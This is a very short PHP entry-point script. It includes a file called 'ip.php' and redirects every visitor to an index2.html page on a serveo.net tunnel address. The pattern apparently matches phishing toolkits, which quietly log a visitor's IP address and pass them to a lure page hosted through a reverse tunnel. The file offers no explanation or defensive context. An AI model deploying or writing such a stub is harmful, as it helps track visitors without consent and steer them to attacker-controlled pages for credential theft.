<?php
include 'ip.php';
header('Location: https://vishaal.serveo.net/index2.html');
exit
?>
